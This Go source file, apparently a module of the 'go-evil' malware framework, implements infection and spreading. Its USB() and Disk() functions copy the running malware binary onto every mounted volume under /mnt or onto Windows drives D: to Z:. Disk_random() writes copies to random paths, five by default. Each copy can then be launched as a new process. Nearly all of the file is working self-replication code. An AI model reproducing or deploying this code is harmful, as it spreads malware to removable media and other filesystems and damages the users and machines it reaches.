package infect

import (
	"io"
	"os"
	"runtime"

	malware "github.com/s9rA16Bf4/go-evil/domains/malware/private"
	"github.com/s9rA16Bf4/go-evil/utility/algorithm/path"
	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/converter"
	iio "github.com/s9rA16Bf4/go-evil/utility/io"
	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

type infect_t struct {
	count             int  // How many infections should happend?
	start_after_birth bool // Should we automatically start the malware after creation?
}

var c_infect = infect_t{0, false}

func Set_infection_count(count string) {
	counter := converter.String_to_int(count, "infect.Set_infection_count()")
	if counter == -1 {
		return
	}
	c_infect.count = counter
}
func Set_start_after_birth() {
	c_infect.start_after_birth = true
}

func USB() {
	switch runtime.GOOS {
	case "linux", "darwin":
		usb_devices, err := os.ReadDir("/mnt")
		if err != nil {
			notify.Error(err.Error(), "infect.USB()")
			return
		}
		for _, line := range usb_devices {
			Disk(line.Name())
		}
	case "windows":
		driver_names := []string{"D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"}
		for _, drive := range driver_names {
			Disk(drive)
		}

	}
}

func Disk(location string) {
	location = run_time.Check_if_variable(location)

	in, err := os.Open(malware.Get_malware_location() + malware.GetName()) // Opens the running malware
	if err != nil {
		in.Close()
		notify.Error(err.Error(), "infect.Disk()")
		return
	}
	if !contains.EndsWith(location, []string{"/"}) {
		location += "/"
	}
	dst, err := os.Create(location + malware.GetName()) // Creates our target
	if err != nil {
		return
	}
	_, err = io.Copy(dst, in)
	if err != nil {
		notify.Error(err.Error(), "infect.Disk()")
		return
	}
	if c_infect.start_after_birth { // Start the newly created malware
		go iio.Run_file(location + malware.GetName()) // Spawns a new process
	}

}
func Disk_random() {
	if c_infect.count == 0 { // If nothing has been set
		Set_infection_count("5")
	}
	for i := 0; i < c_infect.count; i++ {
		Disk(path.Generate_random_path(3))
	}
}
